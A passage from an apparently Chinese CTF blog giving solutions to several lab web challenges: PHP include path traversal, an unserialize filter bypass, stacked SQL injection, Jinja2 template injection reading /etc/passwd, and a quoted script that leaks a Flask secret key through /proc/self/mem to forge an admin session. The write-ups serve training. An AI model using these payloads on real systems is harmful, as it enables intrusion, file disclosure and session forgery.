&#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">#file不为空</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    <span class="comment">#file是字符串</span></span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        <span class="comment">#执行checkFile函数结果为真</span></span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">#文件包含file</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>审完代码发现有hint.php<br>访问得知:flag not here, and flag in ffffllllaaaagggg</p><p>在url中使用..&#x2F;的时候 ..&#x2F;最前面随便写什么都行，只返回..&#x2F;最后面的文件数据。<br>所以只要满足多个..&#x2F;即可退回根目录，再查看根目录下的ffffllllaaaagggg<br>白名单文件+‘？’+..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:55257/source.php?file=hint.php?../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170954425.png"></p><h2 id="7-NewCenter-NO-GFSJ0100"><a href="#7-NewCenter-NO-GFSJ0100" class="headerlink" title="7.NewCenter-NO.GFSJ0100"></a>7.NewCenter-NO.GFSJ0100</h2><p>环境一直报错，先跳过<br>可参考文章:<a href="https://blog.csdn.net/m0_62619559/article/details/121256876">https://blog.csdn.net/m0_62619559/article/details/121256876</a></p><h2 id="8-Web-php-unserialize-NO-GFSJ0710"><a href="#8-Web-php-unserialize-NO-GFSJ0710" class="headerlink" title="8.Web_php_unserialize-NO.GFSJ0710"></a>8.Web_php_unserialize-NO.GFSJ0710</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#传入var</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line"><span class="comment"># 先对varbase64解码</span></span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="comment">#匹配</span></span><br><span class="line">    <span class="comment"># o/c : 1个或多个数字 且忽略大小写</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">#对var进行返学劣化</span></span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>O:数字和C:数字被过滤<br>绕过方法: O:+4</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:4:&quot;</span>,<span class="string">&quot;:+4:&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:1:&quot;</span>,<span class="string">&quot;:2:&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure><p>得到flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170955712.png"></p><h2 id="9-supersqli-NO-GFSJ0718"><a href="#9-supersqli-NO-GFSJ0718" class="headerlink" title="9.supersqli-NO.GFSJ0718"></a>9.supersqli-NO.GFSJ0718</h2><p>报错注入正常</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:59473/?inject=1%27%20and%20extractvalue(1,concat(0x7e,database(),0x7e))%20and%20%271%27=%271</span><br></pre></td></tr></table></figure><p>爆出库名supersqli<br>想继续爆破，发现select ,where,. 都被过滤，猜测使用mysql语句，使用堆叠注入<br>查看库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170956068.png"></p><p>查看表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show tables;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170956749.png"><br>查列名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from words;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170958667.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171000210.png"></p><p>因为无法使用select语句将内容取出，只能借助题目中查数据所使用的select语句<br>猜测原select语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from words where id=&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>可以通过将words表改成其他的名字<br>将1919810931114514的臭表(bushi)名称改成words<br>再把flag列名改为id<br>这样通过1’ or ‘1’&#x3D;’1 即可把1919810931114514表里的所有内容取出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">rename table `words` to `other`;</span><br><span class="line">rename table `1919810931114514` to `words`;</span><br><span class="line">alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure><p>此时通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>成功取出key<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171001268.png"></p><h2 id="10-web2-NO-GFSJ0627"><a href="#10-web2-NO-GFSJ0627" class="headerlink" title="10.web2-NO.GFSJ0627"></a>10.web2-NO.GFSJ0627</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#将str反转</span></span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_o</span>;</span><br><span class="line">    <span class="comment">#遍历$_o每一个元素</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">        <span class="comment">#截取$_o的每一位</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">#将$_c转变为ASCII再加1</span></span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">#将$__转回字符</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="comment">#将转变后的字符再次拼接成字符串</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到</span></span><br><span class="line">    <span class="comment">#strrev是反转</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始字符串 -&gt;反转-&gt;每一位向前移动1个字母-&gt;base64编码-&gt;反转-&gt;每一位向前移动13个字母。</p><p>逆向:<br>结果-&gt;每一位向后移动13个字母-&gt;反转-&gt;base64解码-&gt;每一位向后移动一个字母-&gt;反转。</p><p>ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。字母一共有26个，所以执行了str_rot13的内容，再执行一次str_rot13即可恢复。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$t</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_</span>);</span><br><span class="line">    <span class="variable">$_</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$a0</span>=<span class="number">0</span>;<span class="variable">$a0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_</span>);<span class="variable">$a0</span>++)&#123;</span><br><span class="line">        <span class="comment">#截取$_o的每一位</span></span><br><span class="line">        <span class="variable">$_d</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_</span>,<span class="variable">$a0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">#将$_c转变为ASCII再加1</span></span><br><span class="line">        <span class="variable">$_1</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_d</span>)-<span class="number">1</span>;</span><br><span class="line">        <span class="comment">#将$__转回字符</span></span><br><span class="line">        <span class="variable">$_d</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$_1</span>);</span><br><span class="line">        <span class="comment">#将转变后的字符再次拼接成字符串</span></span><br><span class="line">        <span class="variable">$r</span>=<span class="variable">$r</span>.<span class="variable">$_d</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$r</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171001723.png"></p><h2 id="11-Web-python-template-injection-NO-GFSJ0709"><a href="#11-Web-python-template-injection-NO-GFSJ0709" class="headerlink" title="11.Web_python_template_injection-NO.GFSJ0709"></a>11.Web_python_template_injection-NO.GFSJ0709</h2><p>参考文章:<a href="https://blog.csdn.net/Myon5/article/details/130072619">https://blog.csdn.net/Myon5/article/details/130072619</a></p><p>python模块注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模板引擎让网站实现界面与数据分离</span><br><span class="line">注入模板可能会导致RCE,XSS</span><br><span class="line">jinja模板中&#123;&#123;&#125;&#125;是变量包裹符号</span><br><span class="line">&#123;&#123;&#125;&#125;支持传入变量,也支持一些表达式</span><br><span class="line">flask的模板渲染函数 render_template_string不正确使用会引发ssti</span><br></pre></td></tr></table></figure><p>a.ssti魔术方法<br>__class__  返回类型所属的对象<br>__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析<br>__base__   返回该对象所继承的基类(__base__和__mro__都是用来寻找基类的）<br>__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br>__init__  类的初始化方法<br>__globals__  对包含函数全局变量的字典的引用<br>__builtins__  builtins就是引用</p><p>b.获取基类方法<br>[].__class__.__base__<br>‘’.__class__.__mro__[2]<br>().__class__.__base__<br>{}.__class__.__base__<br>request.__class__.__mro__[8] 　　<br>[].__class__.__bases__[0]<br>获取基本类的子类<br>[].__class__.__base__.__subclasses__()</p><p>1.测试是否存在模板注入<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171002979.png"><br>发现1+1被执行</p><p>2.首先查找Object类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63090/%7B%7B&#x27;&#x27;.__class__.__mro__[2]%7D%7D</span><br></pre></td></tr></table></figure><p>发现是Object类</p><p>3.寻找object类的子类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:63090/%7B%7B&#x27;&#x27;.__class__.__mro__[2].__subclasses__()%7D%7D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171003431.png"><br>利用&lt;type ‘file’&gt;数下来是第四十一个,索引从0开始<br>即’’.__class__.__base__.__subclasses__()[40]</p><p>4.尝试读取文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>成功读取<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171003737.png"><br>尝试读取.&#x2F;flag &#x2F;flag均失败<br>寻找可执行命令的类<br>&lt;class ‘site._Printer’&gt; 可用于执行命令</p><p>5.借助site._Printer执行命令<br>数出来是第72个,执行ls</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308171004774.png"></p><p>6.再借助file类读取fl4g即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:64350/%7B%7B[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()%7D%7D</span><br></pre></td></tr></table></figure><h2 id="12-catcatnew-NO-GFSJ1168"><a href="#12-catcatnew-NO-GFSJ1168" class="headerlink" title="12.catcatnew-NO.GFSJ1168"></a>12.catcatnew-NO.GFSJ1168</h2><p>潮汐指纹&#x3D;&gt;网站由python编写<br>|中间件|Werkzeug&#x2F;2.2.2 Python&#x2F;3.7.12<br>推测是flask框架</p><p>读取app.py文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:58061/info?file=../app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line">__name__,</span><br><span class="line">static_url_path=<span class="string">&#x27;/&#x27;</span>, </span><br><span class="line">static_folder=<span class="string">&#x27;static&#x27;</span> </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">flag = cat(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">os.remove(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line">cats_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line">cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end)) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_can_list_root</span>():</span><br><span class="line"><span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>: </span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure><p>想要访问到flag,需要访问&#x2F;admin并且传入session中的参数 admin&#x3D;1<br>但是session要自己伪造</p><p>看wp了解到</p><ol><li>python存储对象的位置在堆上</li><li>app是个Flask对象，而secret key在app.config[‘SECRET_KEY’]，读取&#x2F;proc&#x2F;self&#x2F;mem得到进程的内存内容，进而获取到SECRET_KEY</li><li>不过读&#x2F;proc&#x2F;self&#x2F;mem前要注意，&#x2F;proc&#x2F;self&#x2F;mem内容较多而且存在不可读写部分，直接读取会导致程序崩溃，因此需要搭配&#x2F;proc&#x2F;self&#x2F;maps获取堆栈分布，结合maps的映射信息来确定读的偏移值<br>大佬的读取&#x2F;proc&#x2F;self&#x2F;maps+&#x2F;proc&#x2F;self&#x2F;mem+SECRET_KEY的脚本</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#Edited by lx56@blog.lxscloud.top</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast, sys</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:60014/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此程序只能运行于Python3以上</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="comment">#Encode a Flask session cookie</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment">#请求file路由进行读取</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    <span class="comment">#匹配指定格式的地址</span></span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#设置起始和结束位置并读取/proc/self/mem</span></span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span></span><br><span class="line">            secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> secret_key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">                s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置session中admin的值为1</span></span><br><span class="line">data = <span class="string">&#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span></span><br><span class="line"><span class="comment">#伪造session</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;session=&quot;</span> + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#请求admin路由</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = requests.get(url + <span class="string">&quot;admin&quot;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag is&quot;</span>, flag.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something error&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集学习与总结</title>
      <link href="/2023/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/</url>
      
